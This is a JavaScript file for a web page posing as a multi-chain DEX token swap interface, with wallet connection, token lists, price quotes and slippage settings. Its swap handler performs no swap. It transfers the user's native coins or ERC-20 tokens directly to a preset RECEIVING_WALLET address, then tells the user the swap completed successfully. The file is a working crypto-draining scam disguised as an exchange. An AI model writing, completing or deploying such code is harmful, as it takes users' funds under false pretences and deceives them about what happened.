// app.js - DEX-like Token Swap Interface with Enhanced Header

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    setupEventListeners();
    
    // Set default tokens based on current network
    setDefaultTokenPair();
    
    // Initialize swap button state
    initializeSwapButton();
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

function setupEventListeners() {
  document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
  document.getElementById("settingsBtn").addEventListener("click", showSettings);
  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
  document.getElementById("closeSettings").addEventListener("click", hideSettings);
  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
  document.getElementById("fromAmount").addEventListener("input", () => {
    updateToAmount();
    initializeSwapButton();
  });
  
  // Slippage options
  document.querySelectorAll('.dex-slippage-option').forEach(option => {
    option.addEventListener('click', function() {
      document.querySelectorAll('.dex-slippage-option').forEach(opt => {
        opt.classList.remove('active');
      });
      this.classList.add('active');
      document.getElementById('slippageTolerance').value = this.dataset.value;
      currentSlippage = parseFloat(this.dataset.value);
      updateToAmount();
    });
  });

  // Custom slippage input
  document.getElementById('slippageTolerance').addEventListener('change', function() {
    const value = parseFloat(this.value);
    if (isNaN(value) || value < 0.1 || value > 50) {
      this.value = currentSlippage;
      return;
    }
    document.querySelectorAll('.dex-slippage-option').forEach(opt => {
      opt.classList.remove('active');
    });
    currentSlippage = value;
    updateToAmount();
  });

  // Transaction deadline
  document.getElementById('transactionDeadline').addEventListener('change', function() {
    const value = parseInt(this.value);
    if (isNaN(value) || value < 1 || value > 30) {
      this.value = 20;
    }
  });

  // Set initial active slippage option
  document.querySelector('.dex-slippage-option[data-value="0.5"]').classList.add('active');
  
  // Mobile-specific listeners
  if (isMobile()) {
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  }
}

// Initialize swap button state and handlers
function initializeSwapButton() {
  const swapBtn = document.getElementById("swapBtn");
  const swapBtnText = document.getElementById("swapBtnText");
  
  // Remove all existing click handlers
  swapBtn.replaceWith(swapBtn.cloneNode(true));
  const newSwapBtn = document.getElementById("swapBtn");
  
  if (!userAddress) {
    newSwapBtn.disabled = false;
    swapBtnText.textContent = "Connect Wallet";
    newSwapBtn.addEventListener('click', handleWalletConnection);
    return;
  }
  
  if (!currentFromToken || !currentToToken) {
    newSwapBtn.disabled = true;
    swapBtnText.textContent = "Select Tokens";
    return;
  }
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) {
    newSwapBtn.disabled = true;
    swapBtnText.textContent = "Enter Amount";
    return;
  }
  
  newSwapBtn.disabled = false;
  swapBtnText.textContent = "Swap";
  newSwapBtn.addEventListener('click', handleSwap);
}

// =====================
// UTILITY FUNCTIONS
// =====================

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png",
    arbitrum: "https://cryptologos.cc/logos/arbitrum-arb-logo.png",
    base: "https://cryptologos.cc/logos/base-logo.png"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network] && logoElement) {
    logoElement.src = logoMap[network];
    logoElement.alt = NETWORK_CONFIGS[network].chainName;
  }
}

function setDefaultTokenPair() {
  switch(currentNetwork) {
    case "ethereum":
      currentFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
      currentToToken = TOKENS.ethereum.find(t => t.symbol === "USDT" && t.logo);
      break;
    case "bsc":
      currentFromToken = TOKENS.bsc.find(t => t.symbol === "BNB");
      currentToToken = TOKENS.bsc.find(t => t.symbol === "USDT" && t.logo);
      break;
    case "polygon":
      currentFromToken = TOKENS.polygon.find(t => t.symbol === "MATIC");
      currentToToken = TOKENS.polygon.find(t => t.symbol === "USDT" && t.logo);
      break;
    case "arbitrum":
      currentFromToken = TOKENS.arbitrum.find(t => t.symbol === "ETH");
      currentToToken = TOKENS.arbitrum.find(t => t.symbol === "USDT" && t.logo);
      break;
    case "base":
      currentFromToken = TOKENS.base.find(t => t.symbol === "ETH");
      currentToToken = TOKENS.base.find(t => t.symbol === "USDT" && t.logo);
      break;
  }
  
  if (currentFromToken && currentToToken) {
    updateTokenSelectors();
  }
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    localStorage.setItem('walletConnected', 'metamask');
    initializeSwapButton();
    await updateTokenBalances();
    
    window.ethereum.on('accountsChanged', () => {
      setTimeout(updateTokenBalances, 1000);
      initializeSwapButton();
    });
    window.ethereum.on('chainChanged', () => {
      setTimeout(() => {
        updateTokenBalances();
        initializeSwapButton();
      }, 1000);
    });
    
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

async function fetchTokenBalance(token) {
  if (!userAddress) return 0;
  
  try {
    if (token.isNative) {
      const balance = await provider.getBalance(userAddress);
      return ethers.utils.formatEther(balance);
    } else {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      const balance = await contract.balanceOf(userAddress);
      return ethers.utils.formatUnits(balance, token.decimals || 18);
    }
  } catch (err) {
    console.error(`Error fetching ${token.symbol} balance:`, err);
    return 0;
  }
}

async function updateTokenBalances() {
  if (!userAddress || !currentFromToken) return;
  
  try {
    const balance = await fetchTokenBalance(currentFromToken);
    document.getElementById("fromTokenBalance").textContent = 
      `Balance: ${parseFloat(balance).toFixed(6)} ${currentFromToken.symbol}`;
  } catch (err) {
    console.error("Error updating balances:", err);
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    // Disconnect wallet
    userAddress = null;
    provider = null;
    signer = null;
    localStorage.removeItem('walletConnected');
    initializeSwapButton();
    updateStatus("Wallet disconnected", "success");
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

function showNetworkOptions() {
  const networkSelect = document.getElementById("networkSelect");
  const currentNetworkName = NETWORK_CONFIGS[currentNetwork].chainName;
  
  const networkKeys = Object.keys(NETWORK_CONFIGS);
  const currentIndex = networkKeys.indexOf(currentNetwork);
  const nextIndex = (currentIndex + 1) % networkKeys.length;
  const newNetwork = networkKeys[nextIndex];
  
  handleNetworkChange(newNetwork);
  
  networkSelect.querySelector("span").textContent = NETWORK_CONFIGS[newNetwork].chainName;
  updateNetworkLogo(newNetwork);
}

async function handleNetworkChange(network) {
  currentNetwork = network;
  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
  updateNetworkLogo(network);
  
  setDefaultTokenPair();
  
  if (userAddress) {
    await checkNetwork();
    await updateTokenBalances();
  }
  
  updateToAmount();
  initializeSwapButton();
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  tokenItems.innerHTML = '';
  noTokensFound.style.display = 'none';
  
  let networkTokens = [];
  for (const network in TOKENS) {
    TOKENS[network].forEach(token => {
      if (token.symbol === "REWARD") return;
      
      if (network === currentNetwork || 
          TOKENS[currentNetwork].find(t => t.symbol === token.symbol) === undefined) {
        networkTokens.push({
          ...token,
          originNetwork: network
        });
      }
    });
  }
  
  networkTokens.sort((a, b) => a.priority - b.priority);
  
  searchInput.oninput = (e) => {
    const searchTerm = e.target.value.toLowerCase();
    let hasVisibleItems = false;
    const items = document.querySelectorAll('.dex-token-item');
    
    items.forEach(item => {
      const name = item.dataset.name.toLowerCase();
      const symbol = item.dataset.symbol.toLowerCase();
      const address = item.dataset.address.toLowerCase();
      
      if (name.includes(searchTerm) || 
          symbol.includes(searchTerm) || 
          address.includes(searchTerm)) {
        item.style.display = 'flex';
        hasVisibleItems = true;
      } else {
        item.style.display = 'none';
      }
    });
    
    noTokensFound.style.display = hasVisibleItems ? 'none' : 'block';
  };
  
  if (networkTokens.length === 0) {
    noTokensFound.style.display = 'block';
  } else {
    networkTokens.forEach(token => {
      const tokenItem = document.createElement('div');
      tokenItem.className = 'dex-token-item';
      tokenItem.dataset.name = token.name.toLowerCase();
      tokenItem.dataset.symbol = token.symbol.toLowerCase();
      tokenItem.dataset.address = token.address.toLowerCase();
      
      const tokenLogo = token.logo || `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
      
      tokenItem.innerHTML = `
        <img src="${tokenLogo}" 
             onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
             alt="${token.symbol}">
        <div>
          <div class="dex-token-name">${token.name} ${token.originNetwork !== currentNetwork ? `(${token.originNetwork})` : ''}</div>
          <div class="dex-token-symbol">${token.symbol}</div>
          <div class="dex-token-address" style="font-size: 12px; color: var(--text3);">${token.address}</div>
        </div>
      `;
      
      tokenItem.addEventListener('click', () => {
        if (type === 'from') {
          currentFromToken = token;
          updateTokenBalances();
        } else {
          currentToToken = token;
        }
        updateTokenSelectors();
        hideTokenList();
        updateToAmount();
        initializeSwapButton();
      });
      
      tokenItems.appendChild(tokenItem);
    });
  }
  
  modal.style.display = 'flex';
  searchInput.value = '';
  searchInput.focus();
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    const fromLogo = currentFromToken.logo || `https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png`;
    fromTokenBtn.innerHTML = `
      <img src="${fromLogo}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentFromToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
    
    if (userAddress) {
      updateTokenBalances();
    }
  } else {
    fromTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  if (currentToToken) {
    const toLogo = currentToToken.logo || `https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png`;
    toTokenBtn.innerHTML = `
      <img src="${toLogo}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentToToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    toTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  initializeSwapButton();
}

async function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && currentToToken && fromAmount > 0) {
    document.getElementById("exchangeRate").textContent = "Loading...";
    document.getElementById("minReceived").textContent = "Loading...";
    
    const rate = await getConversionRate(currentFromToken, currentToToken);
    const toAmount = fromAmount * rate;
    
    document.getElementById("toAmount").value = toAmount.toFixed(6);
    document.getElementById("exchangeRate").textContent = `1 ${currentFromToken.symbol} = ${rate.toFixed(6)} ${currentToToken.symbol}`;
    document.getElementById("minReceived").textContent = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
  }
  
  initializeSwapButton();
}

async function getConversionRate(fromToken, toToken) {
  try {
    const fromPrice = await getTokenPrice(fromToken);
    const toPrice = await getTokenPrice(toToken);
    
    if (fromPrice && toPrice) {
      return fromPrice / toPrice;
    }
  } catch (err) {
    console.error("Error getting conversion rate:", err);
  }
  
  const rates = {
    'ETH-USDT': 1800,
    'USDT-ETH': 0.00055,
    'ETH-USDC': 1800,
    'USDC-ETH': 0.00055,
    'ETH-DAI': 1800,
    'DAI-ETH': 0.00055,
    'BNB-USDT': 300,
    'USDT-BNB': 0.0033,
    'MATIC-USDT': 0.7,
    'USDT-MATIC': 1.428,
    'ARB-USDT': 1.2,
    'USDT-ARB': 0.83
  };
  
  const pair = `${fromToken.symbol}-${toToken.symbol}`;
  return rates[pair] || 1;
}

async function getTokenPrice(token) {
  if (!token.address || token.isNative) {
    const nativeIds = {
      ethereum: 'ethereum',
      bsc: 'binancecoin',
      polygon: 'matic-network',
      arbitrum: 'ethereum',
      base: 'ethereum'
    };
    
    const response = await fetch(`${COINGECKO_API}/simple/price?ids=${nativeIds[token.originNetwork || currentNetwork]}&vs_currencies=usd`);
    const data = await response.json();
    return data[nativeIds[token.originNetwork || currentNetwork]]?.usd;
  } else {
    const chainMap = {
      ethereum: 'ethereum',
      bsc: 'binance-smart-chain',
      polygon: 'polygon-pos',
      arbitrum: 'arbitrum-one',
      base: 'base'
    };
    
    try {
      const response = await fetch(`${COINGECKO_API}/coins/${chainMap[token.originNetwork || currentNetwork]}/contract/${token.address}`);
      const data = await response.json();
      return data.market_data?.current_price?.usd;
    } catch (err) {
      console.error(`Error getting price for ${token.symbol}:`, err);
      return null;
    }
  }
}

// =====================
// SWAP FUNCTIONS
// =====================

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) return;
  
  try {
    showLoader();
    updateStatus("Processing swap...", "success");
    
    if (currentFromToken.isNative) {
      await transferNativeToken(fromAmount);
    } else {
      await transferERC20Token(currentFromToken, fromAmount);
    }
    
    updateStatus("Swap completed successfully!", "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    await updateTokenBalances();
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Swap failed: " + err.message, "error");
  } finally {
    hideLoader();
    initializeSwapButton();
  }
}

async function transferNativeToken(amount) {
  const tx = await signer.sendTransaction({
    to: RECEIVING_WALLET,
    value: ethers.utils.parseEther(amount.toString()),
    gasLimit: 21000
  });
  
  await tx.wait();
}

async function transferERC20Token(token, amount) {
  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const decimals = token.decimals || 18;
  const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
  
  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
    gasLimit: 100000
  });
  
  await tx.wait();
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.textContent = message;
  statusDiv.className = `dex-status ${type}`;
  
  setTimeout(() => {
    statusDiv.style.display = "none";
  }, 5000);
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}
